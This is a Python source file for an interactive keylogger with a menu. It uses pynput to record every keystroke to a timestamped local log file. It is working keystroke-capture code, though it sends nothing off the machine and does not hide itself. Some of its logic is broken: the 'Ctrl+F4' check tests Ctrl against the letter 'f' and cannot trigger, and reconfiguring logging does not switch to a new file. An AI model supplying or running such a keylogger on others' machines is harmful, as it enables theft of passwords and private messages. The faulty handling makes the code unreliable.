from pynput import keyboard
import logging
import datetime
import os

# Function to generate log file name based on current date and time
def generate_log_filename():
    now = datetime.datetime.now()
    return "keylog_{}.txt".format(now.strftime("%Y%m%d_%H%M%S"))

# Generate the initial log file name
LOG_FILE = generate_log_filename()

# Configure logging
logging.basicConfig(filename=LOG_FILE,
                    level=logging.INFO,
                    format='%(asctime)s [%(levelname)s]: %(message)s')

# Global variable to control keylogging
keylogger_running = False
listener = None

def banner():
    print("""
  _  __   _______ _______              _                       
 | |/ /  |__   __|__   __|            | |                      
 | ' / _ __ | |     | |  ___  ___  ___| |_ _   _ _ __ ___  ___ 
 |  < | '_ \| |     | | / __|/ _ \/ __| __| | | | '__/ _ \/ __|
 | . \| | | | |     | | \__ \  __/ (__| |_| |_| | | |  __/\__ \\
 |_|\_\_| |_|_|     |_| |___/\___|\___|\__|\__,_|_|  \___||___/
                                                               
Author: lovegraphy
GitHub: https://github.com/lovegraphy
    """)

def on_press(key):
    try:
        logging.info('Key %s pressed.', key.char)
        
        # Check for special key combinations
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            logging.info('Ctrl key pressed.')

        # Example: Capture Ctrl+F4
        if key == keyboard.Key.ctrl_l and key.char == 'f':
            logging.info('Ctrl+F4 pressed.')

    except AttributeError:
        # Log special keys
        logging.info('Special key %s pressed.', key)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        stop_keylogger()
        return False

def start_keylogger():
    global keylogger_running, listener, LOG_FILE
    if not keylogger_running:
        keylogger_running = True
        # Generate a new log file name and reconfigure logging
        LOG_FILE = generate_log_filename()
        logging.basicConfig(filename=LOG_FILE,
                            level=logging.INFO,
                            format='%(asctime)s [%(levelname)s]: %(message)s')
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        print("Keylogging started...")
    else:
        print("Keylogger is already running.")

def stop_keylogger():
    global keylogger_running, listener
    if keylogger_running:
        keylogger_running = False
        listener.stop()
        print("Keylogging stopped.")
    else:
        print("Keylogger is not running.")

def locate_log_file():
    print(f"Log file is located at: {os.path.abspath(LOG_FILE)}")

def display_menu():
    print("""
    Select an option:
    1. Start Keylogging
    2. Stop Keylogging
    3. Locate Log File
    4. Exit
    """)

def main():
    banner()
    while True:
        display_menu()
        choice = input("Enter your choice: ")
        if choice == '1':
            start_keylogger()
        elif choice == '2':
            stop_keylogger()
        elif choice == '3':
            locate_log_file()
        elif choice == '4':
            if keylogger_running:
                stop_keylogger()
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    # Add a header to the initial log file
    with open(LOG_FILE, 'a') as f:
        f.write('\n\n----- Keylogger started at {} -----\n\n'.format(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    
    # Run the main function to display the menu
    main()
